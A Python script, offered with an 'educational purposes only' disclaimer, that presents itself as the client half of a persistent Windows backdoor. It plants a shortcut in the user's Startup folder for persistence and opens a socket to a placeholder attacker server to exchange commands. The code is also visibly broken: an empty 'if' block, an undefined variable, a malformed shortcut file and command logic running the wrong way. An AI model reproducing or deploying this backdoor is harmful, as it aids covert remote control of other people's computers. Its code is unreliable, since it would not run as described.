# Created August 14th, 2023 - By: Devon Griffith A.K.A. rootPHAGE / 我爱数据
# Run on Windows [ python3 <path to file>\Client-Side_Code.py ]
# This code opens a server connection from a remote machine by making a persistent backdoor

#  Our necessary import statements
import socket
import os

def create_startup_entry():  # The function that adds persistence by making this script run every time the computer boots
    startup_path = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")  # The path to the startup files
    backdoor_path = os.path.abspath(__file__)
    shortcut_path = os.path.join(startup_path, "backdoor.lnk")  # backdoor.lnk is the link to the backdoor we create
    
    with open(shortcut_path, "w") as shortcut:
        shortcut.write(
            f'[InternetShortcut]\nURL=file://{backdoor_path}\n')

def backdoor(client_socket):  # The function to create a backdoor able to accept remote commands from our server
    while True:
        command = input("Enter a command to execute (or 'exit' to quit): ")  # This is the command used to terminate the connection
        client_socket.send(command.encode())
        if command.lower() == "exit":
            break
        result = client_socket.recv(4096).decode()
        print("Result:\n", result)  # Here is where the server returns the results of the commands we run remotely

def main():
    server_ip = "your_server_ip"  # Replace with your server's IP address
    server_port = 12345  # Replace with the same port number as in the server code

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create the socket
    client_socket.connect((server_ip, server_port))  # Now use the IP and Port of our server

    while True:  # This keeps the connection persistent
        create_startup_entry()  # Makes the hidden startup file so this code runs every time the user boots up their computer
        backdoor(client_socket)  # Opens the backdoor to receive the remote commands sent to it
        if choice.lower() == "exit":  # The choice to terminate the connection whenever we want

    client_socket.close()  # Close the socket when we are done

if __name__ == "__main__":
    main()

  
# DO NOT USE THIS SCRIPT MALICIOUSLY - PROVIDED FOR EDUCATIONAL PURPOSES ONLY
